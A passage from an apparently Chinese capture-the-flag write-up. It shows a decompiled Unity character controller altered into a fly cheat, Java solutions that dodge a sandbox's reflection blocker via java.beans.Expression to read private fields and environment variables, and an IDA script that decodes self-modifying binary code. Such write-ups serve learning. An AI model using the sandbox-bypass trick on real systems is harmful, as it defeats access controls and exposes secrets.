class="title">ThirdPersonController</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">bool</span> IsCurrentDeviceMouse</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">get</span> &#123; <span class="keyword">return</span> <span class="keyword">this</span>._playerInput.currentControlScheme == <span class="string">&quot;KeyboardMouse&quot;</span>; &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Awake</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._mainCamera == <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._mainCamera = GameObject.FindGameObjectWithTag(<span class="string">&quot;MainCamera&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>._cinemachineTargetYaw = <span class="keyword">this</span>.CinemachineCameraTarget.transform.rotation.eulerAngles.y;</span><br><span class="line">            <span class="keyword">this</span>._hasAnimator = <span class="keyword">base</span>.TryGetComponent(<span class="keyword">out</span> <span class="keyword">this</span>._animator);</span><br><span class="line">            <span class="keyword">this</span>._controller = <span class="keyword">base</span>.GetComponent&lt;CharacterController&gt;();</span><br><span class="line">            <span class="keyword">this</span>._input = <span class="keyword">base</span>.GetComponent&lt;StarterAssetsInputs&gt;();</span><br><span class="line">            <span class="keyword">this</span>._playerInput = <span class="keyword">base</span>.GetComponent&lt;PlayerInput&gt;();</span><br><span class="line">            <span class="keyword">this</span>.AssignAnimationIDs();</span><br><span class="line">            <span class="keyword">this</span>._jumpTimeoutDelta = <span class="keyword">this</span>.JumpTimeout;</span><br><span class="line">            <span class="keyword">this</span>._fallTimeoutDelta = <span class="keyword">this</span>.FallTimeout;</span><br><span class="line"></span><br><span class="line">            Debug.Log(<span class="string">&quot;[CHEAT] ThirdPersonController loaded&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>._hasAnimator = <span class="keyword">base</span>.TryGetComponent(<span class="keyword">out</span> <span class="keyword">this</span>._animator);</span><br><span class="line">            <span class="keyword">this</span>.JumpAndGravity();</span><br><span class="line">            <span class="keyword">this</span>.GroundedCheck();</span><br><span class="line">            <span class="keyword">this</span>.Move();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">LateUpdate</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.CameraRotation();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AssignAnimationIDs</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>._animIDSpeed = Animator.StringToHash(<span class="string">&quot;Speed&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>._animIDGrounded = Animator.StringToHash(<span class="string">&quot;Grounded&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>._animIDJump = Animator.StringToHash(<span class="string">&quot;Jump&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>._animIDFreeFall = Animator.StringToHash(<span class="string">&quot;FreeFall&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>._animIDMotionSpeed = Animator.StringToHash(<span class="string">&quot;MotionSpeed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">GroundedCheck</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Vector3 origin = <span class="keyword">new</span> Vector3(transform.position.x, transform.position.y - <span class="keyword">this</span>.GroundedOffset, transform.position.z);</span><br><span class="line">            <span class="keyword">this</span>.Grounded = Physics.CheckSphere(origin, <span class="keyword">this</span>.GroundedRadius, <span class="keyword">this</span>.GroundLayers, QueryTriggerInteraction.Ignore);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDGrounded, <span class="keyword">this</span>.Grounded);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CameraRotation</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._input.look.sqrMagnitude &gt;= <span class="number">0.01f</span> &amp;&amp; !<span class="keyword">this</span>.LockCameraPosition)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">float</span> multiplier = <span class="keyword">this</span>.IsCurrentDeviceMouse ? <span class="number">1f</span> : Time.deltaTime;</span><br><span class="line">                <span class="keyword">this</span>._cinemachineTargetYaw += <span class="keyword">this</span>._input.look.x * multiplier;</span><br><span class="line">                <span class="keyword">this</span>._cinemachineTargetPitch += <span class="keyword">this</span>._input.look.y * multiplier;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">this</span>._cinemachineTargetYaw = ThirdPersonController.ClampAngle(<span class="keyword">this</span>._cinemachineTargetYaw, <span class="built_in">float</span>.MinValue, <span class="built_in">float</span>.MaxValue);</span><br><span class="line">            <span class="keyword">this</span>._cinemachineTargetPitch = ThirdPersonController.ClampAngle(<span class="keyword">this</span>._cinemachineTargetPitch, <span class="keyword">this</span>.BottomClamp, <span class="keyword">this</span>.TopClamp);</span><br><span class="line">            <span class="keyword">this</span>.CinemachineCameraTarget.transform.rotation = Quaternion.Euler(<span class="keyword">this</span>._cinemachineTargetPitch + <span class="keyword">this</span>.CameraAngleOverride, <span class="keyword">this</span>._cinemachineTargetYaw, <span class="number">0f</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Move</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">float</span> targetSpeed = <span class="keyword">this</span>._input.sprint ? <span class="keyword">this</span>.SprintSpeed : <span class="keyword">this</span>.MoveSpeed;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._input.move == Vector2.zero)</span><br><span class="line">            &#123;</span><br><span class="line">                targetSpeed = <span class="number">0f</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">float</span> currentHorizontalSpeed = <span class="keyword">new</span> Vector3(<span class="keyword">this</span>._controller.velocity.x, <span class="number">0f</span>, <span class="keyword">this</span>._controller.velocity.z).magnitude;</span><br><span class="line">            <span class="built_in">float</span> speedOffset = <span class="number">0.1f</span>;</span><br><span class="line">            <span class="built_in">float</span> inputMagnitude = <span class="keyword">this</span>._input.analogMovement ? <span class="keyword">this</span>._input.move.magnitude : <span class="number">1f</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (currentHorizontalSpeed &lt; targetSpeed - speedOffset || currentHorizontalSpeed &gt; targetSpeed + speedOffset)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._speed = Mathf.Lerp(currentHorizontalSpeed, targetSpeed * inputMagnitude, Time.deltaTime * <span class="keyword">this</span>.SpeedChangeRate);</span><br><span class="line">                <span class="keyword">this</span>._speed = Mathf.Round(<span class="keyword">this</span>._speed * <span class="number">1000f</span>) / <span class="number">1000f</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._speed = targetSpeed;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>._animationBlend = Mathf.Lerp(<span class="keyword">this</span>._animationBlend, targetSpeed, Time.deltaTime * <span class="keyword">this</span>.SpeedChangeRate);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._animationBlend &lt; <span class="number">0.01f</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._animationBlend = <span class="number">0f</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Vector3 inputDirection = <span class="keyword">new</span> Vector3(<span class="keyword">this</span>._input.move.x, <span class="number">0f</span>, <span class="keyword">this</span>._input.move.y).normalized;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._input.move != Vector2.zero)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._targetRotation = Mathf.Atan2(inputDirection.x, inputDirection.z) * Mathf.Rad2Deg + <span class="keyword">this</span>._mainCamera.transform.eulerAngles.y;</span><br><span class="line">                <span class="built_in">float</span> rotation = Mathf.SmoothDampAngle(transform.eulerAngles.y, <span class="keyword">this</span>._targetRotation, <span class="keyword">ref</span> <span class="keyword">this</span>._rotationVelocity, <span class="keyword">this</span>.RotationSmoothTime);</span><br><span class="line">                transform.rotation = Quaternion.Euler(<span class="number">0f</span>, rotation, <span class="number">0f</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Vector3 targetDirection = Quaternion.Euler(<span class="number">0f</span>, <span class="keyword">this</span>._targetRotation, <span class="number">0f</span>) * Vector3.forward;</span><br><span class="line">            Vector3 move = targetDirection.normalized * (<span class="keyword">this</span>._speed * Time.deltaTime);</span><br><span class="line">            move += <span class="keyword">new</span> Vector3(<span class="number">0f</span>, <span class="keyword">this</span>._verticalVelocity * Time.deltaTime, <span class="number">0f</span>);</span><br><span class="line">            <span class="keyword">this</span>._controller.Move(move);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._animator.SetFloat(<span class="keyword">this</span>._animIDSpeed, <span class="keyword">this</span>._animationBlend);</span><br><span class="line">                <span class="keyword">this</span>._animator.SetFloat(<span class="keyword">this</span>._animIDMotionSpeed, inputMagnitude);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">JumpAndGravity</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">float</span> flySpeed = <span class="number">12f</span>;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">bool</span> ascend = <span class="literal">false</span>;</span><br><span class="line">            <span class="built_in">bool</span> descend = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            Keyboard keyboard = Keyboard.current;</span><br><span class="line">            <span class="keyword">if</span> (keyboard != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (keyboard.spaceKey != <span class="literal">null</span> &amp;&amp; keyboard.spaceKey.isPressed)</span><br><span class="line">                &#123;</span><br><span class="line">                    ascend = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((keyboard.leftCtrlKey != <span class="literal">null</span> &amp;&amp; keyboard.leftCtrlKey.isPressed) ||</span><br><span class="line">                    (keyboard.rightCtrlKey != <span class="literal">null</span> &amp;&amp; keyboard.rightCtrlKey.isPressed))</span><br><span class="line">                &#123;</span><br><span class="line">                    descend = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ascend || descend)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._verticalVelocity = ascend ? flySpeed : -flySpeed;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">this</span>._input.jump = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">this</span>._jumpTimeoutDelta = <span class="keyword">this</span>.JumpTimeout;</span><br><span class="line">                <span class="keyword">this</span>._fallTimeoutDelta = <span class="keyword">this</span>.FallTimeout;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDJump, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDFreeFall, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDGrounded, <span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.Grounded)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._fallTimeoutDelta = <span class="keyword">this</span>.FallTimeout;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDJump, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDFreeFall, <span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._verticalVelocity &lt; <span class="number">0f</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._verticalVelocity = <span class="number">-2f</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._input.jump &amp;&amp; <span class="keyword">this</span>._jumpTimeoutDelta &lt;= <span class="number">0f</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._verticalVelocity = Mathf.Sqrt(<span class="keyword">this</span>.JumpHeight * <span class="number">-2f</span> * <span class="keyword">this</span>.Gravity);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDJump, <span class="literal">true</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._jumpTimeoutDelta &gt;= <span class="number">0f</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._jumpTimeoutDelta -= Time.deltaTime;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._jumpTimeoutDelta = <span class="keyword">this</span>.JumpTimeout;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._fallTimeoutDelta &gt;= <span class="number">0f</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._fallTimeoutDelta -= Time.deltaTime;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>._hasAnimator)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>._animator.SetBool(<span class="keyword">this</span>._animIDFreeFall, <span class="literal">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">this</span>._input.jump = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>._verticalVelocity &lt; <span class="keyword">this</span>._terminalVelocity)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">this</span>._verticalVelocity += <span class="keyword">this</span>.Gravity * Time.deltaTime;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">float</span> <span class="title">ClampAngle</span>(<span class="params"><span class="built_in">float</span> angle, <span class="built_in">float</span> min, <span class="built_in">float</span> max</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (angle &lt; <span class="number">-360f</span>) angle += <span class="number">360f</span>;</span><br><span class="line">            <span class="keyword">if</span> (angle &gt; <span class="number">360f</span>) angle -= <span class="number">360f</span>;</span><br><span class="line">            <span class="keyword">return</span> Mathf.Clamp(angle, min, max);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnDrawGizmosSelected</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Gizmos.color = <span class="keyword">this</span>.Grounded ? <span class="keyword">new</span> Color(<span class="number">0f</span>, <span class="number">1f</span>, <span class="number">0f</span>, <span class="number">0.35f</span>) : <span class="keyword">new</span> Color(<span class="number">1f</span>, <span class="number">0f</span>, <span class="number">0f</span>, <span class="number">0.35f</span>);</span><br><span class="line">            Gizmos.DrawSphere(<span class="keyword">new</span> Vector3(transform.position.x, transform.position.y - <span class="keyword">this</span>.GroundedOffset, transform.position.z), <span class="keyword">this</span>.GroundedRadius);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnFootstep</span>(<span class="params">AnimationEvent animationEvent</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (animationEvent.animatorClipInfo.weight &gt; <span class="number">0.5f</span> &amp;&amp; <span class="keyword">this</span>.FootstepAudioClips.Length != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">int</span> index = UnityEngine.Random.Range(<span class="number">0</span>, <span class="keyword">this</span>.FootstepAudioClips.Length);</span><br><span class="line">                AudioSource.PlayClipAtPoint(<span class="keyword">this</span>.FootstepAudioClips[index], transform.TransformPoint(<span class="keyword">this</span>._controller.center), <span class="keyword">this</span>.FootstepAudioVolume);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnLand</span>(<span class="params">AnimationEvent animationEvent</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (animationEvent.animatorClipInfo.weight &gt; <span class="number">0.5f</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                AudioSource.PlayClipAtPoint(<span class="keyword">this</span>.LandingAudioClip, transform.TransformPoint(<span class="keyword">this</span>._controller.center), <span class="keyword">this</span>.FootstepAudioVolume);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Header(<span class="string">&quot;Player&quot;</span>)</span>] <span class="keyword">public</span> <span class="built_in">float</span> MoveSpeed = <span class="number">2f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> SprintSpeed = <span class="number">5.335f</span>;</span><br><span class="line">        [<span class="meta">Range(0f, 0.3f)</span>] <span class="keyword">public</span> <span class="built_in">float</span> RotationSmoothTime = <span class="number">0.12f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> SpeedChangeRate = <span class="number">10f</span>;</span><br><span class="line">        <span class="keyword">public</span> AudioClip LandingAudioClip;</span><br><span class="line">        <span class="keyword">public</span> AudioClip[] FootstepAudioClips;</span><br><span class="line">        [<span class="meta">Range(0f, 1f)</span>] <span class="keyword">public</span> <span class="built_in">float</span> FootstepAudioVolume = <span class="number">0.5f</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Space(10f)</span>] <span class="keyword">public</span> <span class="built_in">float</span> JumpHeight = <span class="number">1.2f</span>;</span><br><span class="line">        [<span class="meta">Tooltip(<span class="string">&quot;The character uses its own gravity value. The engine default is -9.81f&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> Gravity = <span class="number">-15f</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Space(10f)</span>] <span class="keyword">public</span> <span class="built_in">float</span> JumpTimeout = <span class="number">0.5f</span>;</span><br><span class="line">        [<span class="meta">Tooltip(<span class="string">&quot;Time required to pass before entering the fall state. Useful for walking down stairs&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> FallTimeout = <span class="number">0.15f</span>;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Header(<span class="string">&quot;Player Grounded&quot;</span>)</span>] <span class="keyword">public</span> <span class="built_in">bool</span> Grounded = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> GroundedOffset = <span class="number">-0.14f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> GroundedRadius = <span class="number">0.28f</span>;</span><br><span class="line">        <span class="keyword">public</span> LayerMask GroundLayers;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Header(<span class="string">&quot;Cinemachine&quot;</span>)</span>] <span class="keyword">public</span> GameObject CinemachineCameraTarget;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> TopClamp = <span class="number">70f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> BottomClamp = <span class="number">-30f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">float</span> CameraAngleOverride;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">bool</span> LockCameraPosition;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _cinemachineTargetYaw;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _cinemachineTargetPitch;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _speed;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _animationBlend;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _targetRotation;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _rotationVelocity;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _verticalVelocity;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _terminalVelocity = <span class="number">53f</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _jumpTimeoutDelta;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">float</span> _fallTimeoutDelta;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDSpeed;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDGrounded;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDJump;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDFreeFall;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">int</span> _animIDMotionSpeed;</span><br><span class="line">        <span class="keyword">private</span> PlayerInput _playerInput;</span><br><span class="line">        <span class="keyword">private</span> Animator _animator;</span><br><span class="line">        <span class="keyword">private</span> CharacterController _controller;</span><br><span class="line">        <span class="keyword">private</span> StarterAssetsInputs _input;</span><br><span class="line">        <span class="keyword">private</span> GameObject _mainCamera;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">float</span> _threshold = <span class="number">0.01f</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">bool</span> _hasAnimator;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018165235177.png" alt="image-20251018165235177"></p><p>flag2：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018150628235.png" alt="image-20251018150628235"></p><p>flag{v2ew_beh2nd_the_scene}</p><h3 id="7-岁的毛毛：我要写-Javabinary-java"><a href="#7-岁的毛毛：我要写-Javabinary-java" class="headerlink" title="7 岁的毛毛：我要写 Javabinary-java"></a>7 岁的毛毛：我要写 Javabinary-java</h3><h4 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h4><p>利用 java.beans.Expression 代替我们手动调用 Class.getDeclaredField，从而绕过 Blocker 对 Class.* 的拦截；真正的反射动作发生在 JDK 类内部，我们自己的字节码里不出现受限调用。</p><p>得到 Field 之后，就可以正常 setAccessible(true) 并读取实例上的 flag 值，最后打印即可</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018212318114.png" alt="image-20251018212318114"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.Expression;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">solve</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">Expression</span> <span class="variable">expr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Expression</span>(obj.getClass(), <span class="string">&quot;getDeclaredField&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;flag&quot;</span>&#125;);</span><br><span class="line">      <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> (Field) expr.getValue();</span><br><span class="line">      field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> (String) field.get(obj);</span><br><span class="line">      System.out.println(flag);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251018214124943.png" alt="image-20251018214124943"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.Expression;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">solve</span><span class="params">(Object ignored)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">Expression</span> <span class="variable">expr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Expression</span>(System.class, <span class="string">&quot;getenv&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;FLAG2&quot;</span>&#125;);</span><br><span class="line">      <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> expr.getValue();</span><br><span class="line">      <span class="keyword">if</span> (value <span class="keyword">instanceof</span> String flag &amp;&amp; !flag.isEmpty()) &#123;</span><br><span class="line">          <span class="keyword">return</span> flag;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;notflag&#123;&#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="枚举高手的-bomblab-审判"><a href="#枚举高手的-bomblab-审判" class="headerlink" title="枚举高手的 bomblab 审判"></a>枚举高手的 bomblab 审判</h3><h4 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h4><p>sub_16B0 自修改：调用 mprotect 将 loc_1550 区域改写可执行并基于地址 Xor 复原，再改回只读执行。静态分析时手动解密或运行到 mprotect 之后 dump 代码即可绕过</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251020220621812.png" alt="image-20251020220621812"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x42 - base + (uintptr_t)p = 0x42 - base + (base + i) = 0x42 + i。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">base = <span class="number">0x1550</span></span><br><span class="line">length = <span class="number">339</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">  original = ida_bytes.get_wide_byte(base + i)</span><br><span class="line">  decoded = original ^ (<span class="number">0x42</span> + i)</span><br><span class="line">  ida_bytes.patch_byte(base + i, decoded)</span><br></pre></td></tr></table></figure><p><img 